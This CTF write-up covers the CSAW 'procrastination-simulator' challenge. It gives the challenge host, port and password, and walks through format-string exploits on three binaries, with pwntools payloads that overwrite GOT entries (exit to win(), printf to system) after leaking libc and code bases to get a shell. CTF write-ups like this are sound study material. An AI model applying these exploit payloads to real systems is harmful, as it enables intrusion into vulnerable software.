## procrastination-simulator
```
procrastination-simulator
point: 430
Oh noes! I partied all weekend and now it's an hour before the CTF ends and I have school deadlines tonight too. Can you help me write 60 reports and pwn 50 challenges by Sunday afternoon? nc auto-pwn.chal.csaw.io 11001 with password cd80d3cd8a479a18bbc9652f3631c61c
```
`nc auto-pwn.chal.csaw.io 11001` then enter the password, we get 
the binary like this:
![given_binary](https://user-images.githubusercontent.com/87422359/133044852-ecc1638d-c82f-4e11-8d92-853e5ead68f6.png)
we write it to a file then convert it to binary by `xxd -r`<br />
When we pwned and got shell, there was a message on the server give
us another address, port, password. <br />
the binaries are changed a several times(at port 16, 32, ...), we 
need to pwn all them to get the flag. <br />
<br />
### file_4
![image](https://user-images.githubusercontent.com/87422359/133046641-66cd8285-9bfe-43e3-b136-dd8d0048f8c0.png)
<br />
![image](https://user-images.githubusercontent.com/87422359/133046725-49740c3c-6793-4e24-b3c3-e9ff5ca6392c.png)
<br />
![image](https://user-images.githubusercontent.com/87422359/133046834-aa56ed9a-f9d8-405b-8413-418d22211268.png)
<br />
there are a fsb, and function to get shell.
<br />
what we need to do is overwrite `win()`'s address to `put's got`.
<br />
payload:
<br />
```python
payload  = 'aa'
payload += p32(e.got["exit"])
payload += '%' + str((e.sym['win'] & 0xffff) - 6) + 'd%6$hn'
## send password
r.sendlineafter("password", "cd80d3cd8a479a18bbc9652f3631c61c")
r.sendlineafter('generate a report', payload)
```
![image](https://user-images.githubusercontent.com/87422359/133050190-6ddfbe51-010a-45f7-9050-3f643c7d9c16.png)
### file_2
![image](https://user-images.githubusercontent.com/87422359/133050630-44a7fde5-2f7e-4564-aa28-1c4c01472dd4.png)
<br />
we still have fsb but there is no win function this time.
<br />
![image](https://user-images.githubusercontent.com/87422359/133051357-b5211b7d-7eea-44a1-b9e1-7767891d97c8.png)
<br />
but there is a `/bin/sh` in the binary so i decide to dive into the binary
and i got this
<br />
![image](https://user-images.githubusercontent.com/87422359/133052191-8987d866-8f9f-48fe-84b0-45d96c346765.png)
<br />
same way, but `0x401534` insteal of `win()`'s address.
### file_1
![image](https://user-images.githubusercontent.com/87422359/133052449-5108e99f-145f-4eb2-9523-4c3c1c2b351a.png)
<br />
this time we got 3 times fsb but `PIE enable`, what we
need to do is leak `libc base`, leak `code base` then overwrite `system`'s address
to `printf got`, then enter `/bin/sh`, programe will run `printf('/bin/sh')`
but printf is overwritten so we get `system('/bin/sh')`
<br />
payload:
<br />
```python
## stage 1
payload  = ''
payload += '%45$p %7$p'
p.sendlineafter('> ', payload)

## leaking
p.recvuntil("ntents of Report 1:\n")
leak = int(p.recvuntil(' ').strip(), 16)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
log.info("leak :%s:" % hex(leak))
libc.sym['win'] = one[0]
libc.address = leak - 0x0270b3
log.info("base :%s:" % hex(libc.address))
log.info("win :%s:" % hex(libc.sym['win']))
leak1 = int(p.recvline().strip(), 16) - 156
log.info("target :%s:" % hex(leak1))

## stage 2
payload  = ''
payload += '%' + str(libc.sym["system"] >> 16 & 0xff) + 'd%13$hhn'
payload += '%' + str((libc.sym["system"] & 0xffff) - (libc.sym["system"] >> 16 & 0xff)) + 'd%12$hn'
payload  = payload.ljust(32,'a')
payload += p64(leak1)
payload += p64(leak1 + 2)
p.sendlineafter('s batch!!', payload)

## stage 3
payload  = '/bin/sh'
sleep(1)
p.sendline(payload)
```